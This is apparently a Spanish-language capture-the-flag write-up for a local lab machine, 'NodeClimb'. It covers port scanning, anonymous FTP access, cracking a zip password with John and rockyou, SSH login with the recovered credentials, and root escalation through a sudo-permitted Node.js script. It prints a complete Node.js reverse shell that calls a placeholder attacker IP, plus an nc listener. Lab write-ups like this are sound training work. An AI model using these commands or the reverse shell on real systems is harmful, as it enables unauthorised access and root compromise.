- Tags: #NodeClimb #ReverseShellJS
---
[Maquina NodeClimb](https://mega.nz/file/4b1ymaiL#xBg29RY4Qo6U9rJLTtSjgUOX2BWTGd-qSfYEpDEMdQs) ==> Enlace de descarga al laboratorio
```bash
7z x nodeclimb.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh nodeclimb.tar # Desplegamos el laboratorio.
```

#### Fase Reconocimiento:
```bash
172.17.0.2 --> Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para ver si tenemos conectividad con el target.

wichSystem.py 172.17.0.2 # Detectamos que nos estamos enfrentando ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -P 172.17.0.2 -oG allPorts # Realizamos descubrimiento
extractPorts allPorts # Parseamos la informacion mas importante del primer escaneo
nmap -sC -sV -p21,22 172.17.0.2 -oN targeted # Realizmaos un escaneo exhaustivo para determinar el servicio y la version que corrern detras de estos puetos
```

**( ftp-anon: Anonymous FTP login allowed (FTP code 230) )** ==> Para el servicion **FTP** tenemos habilitado al usuario **Anonymous** que contempla este archivo: **( secretitopicaron.zip )**
**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** ==> Tenemos un servicio ssh.

#### Fase Reconocimiento FTP:
```bash
ftp 172.17.0.2 # Logramos conectarnos como el usuario anonymous sin proporcionar password
ls -al # Listamos archivos detecdtando: ( secretitopicaron.zip )
get secretitopicaron.zip # Descargamos este contenido
```

```bash
zip2john secretitopicaron.zip > secretoHash # Convertimos el comprimido a un hast para poder aplicar fuerza bruta con john
john --format=PKZIP secretoHash --wordlist=/usr/share/wordlists/rockyou.txt # Logramos obtener la password: ( password1 )
7z x secretitopicaron.zip --> # Proporcionamos la passsword obtenida
password.txt # Ahora tenemos este archivo con unas credenciales de incio de sesion.
```

```bash
File: password.txt
──────────────────────────────────────
mario:laKontraseñAmasmalotaHdelbarrioH
```


#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh mario@172.17.0.2
```
---

#### Fase Escalada Privilegios:
**( script.js )** ==> Tenemos este archivo que no tiene nada.
```bash
sudo -l # Podemos aprovecharnos para crear una revershell para ganar acceso como root
User mario may run the following commands on e4a404b1c0d5:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Nos aprovechamos de esto para crearnos una reverse shell y elevar privilegios a root
```js
(function() {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    
    var client = new net.Socket();
    
    client.connect($PORT, "$IP_ATACANTE", function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    
    return /a/;
})();
```
---
```bash
nc -nlvp 443 # Nos podemos en escucha 

sudo -u root /usr/bin/node /home/mario/script.js # Lanzamos para obtener una shell como root.
```